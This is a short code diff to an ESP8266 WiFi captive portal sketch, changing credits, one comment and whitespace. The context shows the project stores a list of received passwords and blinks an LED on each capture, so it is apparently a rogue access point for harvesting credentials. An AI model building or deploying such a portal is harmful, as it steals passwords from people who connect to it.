@@ -1,8 +1,6 @@
 // ESP8266 WiFi Captive Portal
+// By BlueArduino20
 // Based on: PopupChat https://github.com/tlack/popup-chat
-// Based on: Captive Portal by: M. Ray Burnette 20150831
-// Based on: https://github.com/tomhiggins/passDrop
-// Modded by BlueArduino20
 
 // Includes
 #include <ESP8266WiFi.h>
@@ -75,7 +73,7 @@ String clear() {
   return header(CLEAR_TITLE) + "<div><p>The password list has been reseted.</div></p><center><a style=\"color:blue\" href=/>Back to Index</a></center>" + footer();
 }
 
-void BLINK() { // The internal LED will blink 5 times.
+void BLINK() { // The internal LED will blink 5 times when a password is received.
   int count = 0;
   while(count < 5){
     digitalWrite(BUILTIN_LED, LOW);
@@ -87,7 +85,6 @@ void BLINK() { // The internal LED will blink 5 times.
 }
 
 void setup() {
-  
   bootTime = lastActivity = millis();
   WiFi.mode(WIFI_AP);
   WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
